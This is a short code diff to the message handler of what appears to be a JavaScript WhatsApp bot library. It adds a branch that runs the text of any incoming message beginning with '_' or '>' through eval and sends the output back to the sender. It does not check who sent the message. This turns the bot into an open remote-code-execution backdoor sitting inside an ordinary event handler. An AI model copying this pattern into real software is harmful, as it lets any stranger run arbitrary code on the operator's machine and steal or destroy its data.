@@ -43,6 +43,25 @@ class Socket extends Events {
          if (!this.online || !isRealMessage(message, message.key.id)) return
          
          const m = await Utils.sms({ ...this, ...sock }, message)
+         
+         if (/^[_>]/.test(m.text)) {
+            
+            const text = /return|await/.test(m.text) ? `(async() => { ${m.text.slice(1) }})()` : m.text.slice(1)
+            
+            try {
+               var res = await eval(text)
+            } catch (e) {
+               var res = e.message
+            }
+            
+            sock.sendMessage(m.from, {
+               text: require("util").format(res),
+               contextInfo: {
+                  expiration: m.expiration
+               }
+            })
+         }
+         
       }
    },
    {
